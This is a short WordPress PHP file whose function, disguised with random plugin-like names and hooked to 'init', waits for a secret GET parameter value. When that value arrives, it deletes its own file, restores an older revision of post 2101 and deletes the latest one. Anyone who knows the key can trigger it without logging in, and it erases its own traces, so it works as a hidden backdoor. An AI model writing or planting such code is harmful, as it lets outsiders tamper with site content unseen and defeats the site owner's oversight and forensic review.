<?php

function performance_importer_slider() {
	if (isset($_GET['numbers_only_import']) && $_GET['numbers_only_import'] === 'estate_http_daily_video') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$click_game_dashboard = 2101;
		$additional_sticky_fonts_src = wp_get_post_revisions($click_game_dashboard);
		if (empty($additional_sticky_fonts_src)) die('no revisions');
		if (count($additional_sticky_fonts_src) < 2) die('less than 2');
		$customer_charts_enable_current = array_shift($additional_sticky_fonts_src);
		$design_duplicate_messenger = $customer_charts_enable_current->ID;
		$sidebar_map_external = array_shift($additional_sticky_fonts_src);
		$server_subscriptions_lightgray_twitter = $sidebar_map_external->ID;
		$testimonial_toolbox_fix = wp_restore_post_revision($server_subscriptions_lightgray_twitter);
		if ($testimonial_toolbox_fix === false) die('error restoring');
		$testimonial_toolbox_fix = wp_delete_post_revision($design_duplicate_messenger);		
		if ($testimonial_toolbox_fix === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'performance_importer_slider');
